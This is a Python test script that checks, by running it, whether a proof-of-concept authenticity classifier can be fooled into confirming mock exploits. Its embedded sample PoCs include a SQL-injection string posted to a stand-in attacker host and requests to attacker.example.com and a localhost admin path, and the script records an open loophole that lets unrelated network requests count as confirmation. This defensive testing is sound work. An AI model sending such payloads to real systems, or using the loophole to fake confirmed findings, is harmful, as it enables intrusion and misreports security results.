#!/usr/bin/env python3
"""D2 — Re-verify (by EXECUTION) the authenticity-gate trust claims:

  (M4-a)  a bare attribute reference (NO ast.Call) no longer flips a mock to
          real_target  -> should be self_contained_mock / may_confirm=False.
  (M4-a') network_live mode STILL confirms a non-localhost HTTP PoC with NO
          target import -> may_confirm=True with zero target code exercised.

Also probes a few adversarial bypasses of the new ast.Call requirement.

Drives the REAL ngv2.poc_authenticity_gate.classify_poc_authenticity.
"""
import sys, json
sys.path.insert(0, "/home/xnihil0zer0/NobleGreedv2")
from ngv2.poc_authenticity_gate import classify_poc_authenticity

TARGETS = ["acmecorp_app", "acmecorp_app.views"]

def show(label, src, targets=TARGETS):
    r = classify_poc_authenticity(src, targets)
    print(f"--- {label} ---")
    print("  mode={mode}  imports_target={imports_target}  network={issues_network_request}"
          "  vuln_local={defines_vuln_locally}  MAY_CONFIRM={may_confirm}".format(**r))
    return r

print("=== M4-a: bare attribute ref (no call) should NOT flip a mock ===")
r1 = show("bare attr ref: acmecorp_app.__name__ (no Call)", """
import acmecorp_app
x = acmecorp_app.__name__
print("VULNERABLE")
""")
print(f"  CLAIM 'bare attr fixed' -> {'CONFIRMED (mock, may_confirm=False)' if not r1['may_confirm'] else 'REFUTED'}")
print()

r1b = show("real target Call: acmecorp_app.run() ", """
import acmecorp_app
acmecorp_app.run("payload")
print("VULNERABLE")
""")
print(f"  positive control (real call) -> may_confirm={r1b['may_confirm']} (expect True)")
print()

print("=== M4-a': network_live confirms a NON-LOCALHOST HTTP PoC w/ NO target import ===")
r2 = show("requests.post to attacker.example.com, no target import", """
import requests
resp = requests.post("http://attacker.example.com/x", data={"q": "1' OR '1'='1"})
print(resp.text)
print("VULNERABLE")
""")
print(f"  CLAIM 'network_live still confirms w/o target' -> "
      f"{'CONFIRMED (may_confirm=True, no target exercised)' if r2['may_confirm'] and not r2['imports_target'] else 'REFUTED'}")
print()

print("=== Extra adversarial probes of the ast.Call requirement ===")
# (e) target imported & CALLED but in dead code path (never reached at runtime).
show("target call inside `if False:` dead branch", """
import acmecorp_app
if False:
    acmecorp_app.run("x")
print("VULNERABLE")
""")
# (f) target name bound but the *call* is on an unrelated alias attribute chain.
show("import target, call only str(), reference acmecorp_app.X as attr-of-attr", """
import acmecorp_app as a
v = a.config.SECRET     # attribute access, NOT a call on a
print(str(v))
print("VULNERABLE")
""")
# (g) network call to a localhost URL should NOT be network_live (targets_localhost)
show("requests to 127.0.0.1 (localhost) -> should be mock, not network_live", """
import requests
requests.get("http://127.0.0.1:8080/admin")
print("VULNERABLE")
""")
# (h) network_live but ALSO defines a local vuln handler -> should be mock
show("network call + local 'vuln' def -> defines_vuln_locally blocks network_live", """
import requests
def vuln_handler(x):
    return x
requests.get("http://attacker.example.com/")
""")

print()
print("=== SUMMARY ===")
print("M4-a bare-attr fixed:        ", "CONFIRMED" if not r1['may_confirm'] else "REFUTED")
print("M4-a' network_live bypass:   ", "CONFIRMED-OPEN" if (r2['may_confirm'] and not r2['imports_target']) else "CLOSED")
